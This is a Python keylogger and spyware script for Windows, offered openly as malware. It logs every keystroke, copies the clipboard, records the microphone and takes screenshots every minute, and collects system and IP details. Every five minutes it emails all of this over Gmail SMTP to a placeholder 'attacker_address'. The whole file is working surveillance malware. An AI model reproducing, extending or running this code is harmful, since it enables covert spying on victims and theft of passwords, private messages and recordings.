from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import os
import threading
from scipy.io.wavfile import write
import sounddevice as sd
from requests import get
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "system_info.txt"
clipboard = "clipboard_info.txt"
audio_information = "audio.wav"
# Time indicates the time of recording the live audio in seconds
microphone_time = 30
screenshot_information = "screenshot.png"
# This will be used to send you the logs and other stuffs
email_address = "temporary_email"
password = "temporary_email_password"
to_address = "attacker_address"

file_path = "insert file path of your environment"


extend = "\\"


def send_mail():
    # 300 indicates the time gap to send the mail
    threading.Timer(300.0, send_mail).start()
    from_address = email_address
    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = "Log File"
    body = "Body_of_the_Email"
    msg.attach(MIMEText(body, 'plain'))
    dir_path = file_path+extend
    files = [keys_information, system_information, clipboard,screenshot_information, audio_information]
    for f in files:
        file_paths = os.path.join(dir_path, f)
        attachment = open(file_paths, "rb")
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(attachment.read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "Attachment ; filename = %s" % f)
        msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_address, password)
    text = msg.as_string()
    s.sendmail(from_address, to_address, text)
    s.quit()


send_mail()


def computer_information():
    if os.path.exists(file_path + extend + system_information):
        os.remove(file_path + extend + system_information)
    else:
        print("The file does not exist")

    with open(file_path + extend + system_information, "a") as f:
        host_name = socket.gethostname()
        ip_address = socket.gethostbyname(host_name)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: "+public_ip)
        except Exception:
            f.write("Failed to receive Public IP Address")

        f.write("Processor: "+platform.processor()+"\n")
        f.write("System: "+platform.system()+" "+platform.version()+"\n")
        f.write("Machine: "+platform.machine() + "\n")
        f.write("Host Name: "+host_name + "\n")
        f.write("Private IP Address: "+ip_address + "\n")


computer_information()


def copy_clipboard():
    with open(file_path+extend+clipboard, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Cannot be copied")


copy_clipboard()


def microphone():
    threading.Timer(60.0, microphone).start()
    fs = 44100
    seconds = microphone_time
    my_recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path+extend+audio_information, fs, my_recording)


microphone()


def screenshot():
    threading.Timer(60.0, screenshot).start()
    image = ImageGrab.grab()
    image.save(file_path+extend+screenshot_information)


screenshot()

count = 0
keys = []


def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


# def on_release(key):
#     if key == Key.esc:
#         return False



with Listener(on_press=on_press) as listener:
    listener.join()

